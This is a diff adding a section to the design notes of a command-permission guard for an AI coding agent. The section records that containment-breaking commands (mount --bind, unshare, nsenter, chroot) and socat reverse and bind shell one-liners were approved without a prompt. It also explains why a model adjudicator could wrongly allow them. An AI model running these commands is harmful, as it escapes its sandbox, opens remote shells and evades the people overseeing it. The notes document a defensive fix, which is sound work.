@@ -876,6 +876,57 @@ what will report if either side of that judgement stops holding.
 **Links.** `hooks/security-guard.sh` · `hooks/permission-broker.sh` ·
 `tests/guard-portability.test.sh` · `bin/doctor`
 
+## A rule that moves the ground the other rules stand on is not an ordinary rule
+
+**Problem.** Every containment decision in `hooks/permission-broker.sh` is made
+by canonicalising a path and asking whether it is inside the workspace — `canon`,
+`in_ws`, `is_sensitive`, `del_ok`, and every `denyWrite` entry the sandbox
+enforces. All of it rests on one unstated premise: **a path means the same thing
+after the command runs as it did when it was classified.**
+
+Two families make that premise false without breaking any individual rule, and
+both were approved with no dialog:
+
+```
+mount --bind /etc /tmp/x              allow    a path now resolves elsewhere
+unshare -r --map-root-user bash -c …  allow    a program runs in another namespace
+nsenter -t 1 -m -u -i -n -p bash      allow    …in another process's namespaces
+chroot /tmp/root /bin/sh              allow    …under another root
+```
+
+Separately, `socat` was missing from the network-egress list that already
+carried `nc`, `ncat`, `ssh`, `scp`, `sftp`, `rsync` and `telnet`, while being
+strictly more capable than any of them: `socat TCP:host:443 EXEC:/bin/bash` is a
+reverse shell and `socat TCP-LISTEN:9999,fork EXEC:/bin/bash` is a bind shell.
+Both were approved. It is also the one network tool this project installs
+itself, in `make deps`, for Claude Code's own sandbox networking — so it is
+present on every machine that followed the quick start.
+
+**Decision.** All of them join the critical set in section 1, above Codex.
+
+Above Codex is the point. The mistake available here is exactly the one an
+adjudicator makes: `unshare … id` and `mount --bind` genuinely do not write
+anything the rubric asks about, so a model reading "does this change a file,
+process, configuration or remote state?" can reasonably answer no. A rule that
+invalidates the containment argument itself must not be answerable by a model,
+so `escalate` exits before section 6 is reached.
+
+`unshare`, `nsenter`, `chroot`, `setpriv` and `capsh` also belong to a family
+the broker already refuses for a second reason: like `env` and `xargs`, argv[0]
+does not say what runs.
+
+**Confidence: high for the shapes named; medium for coverage.** `mount` and
+`umount` are anchored to a clause boundary rather than matched as words, because
+they are ordinary English inside other tokens — `npm run mount-test`,
+`cat /proc/mounts`, `git commit -m "fix unmount handling"` are regression tests,
+not hypotheticals. `tests/approval.test.sh` pins eleven forms interactively and
+unattended plus five false-positive controls. This does not make the guard a
+sandbox-escape defence; `docs/verification.md` still says it is not. It closes
+the case where the framework's own path reasoning was being invalidated by a
+command it had approved.
+
+**Links.** `hooks/permission-broker.sh` · `tests/approval.test.sh`
+
 ## Scheduled execution is a class of its own, because every other layer is scoped to a session
 
 **Problem.** The broad local-dev fallback in `hooks/permission-broker.sh` trusts
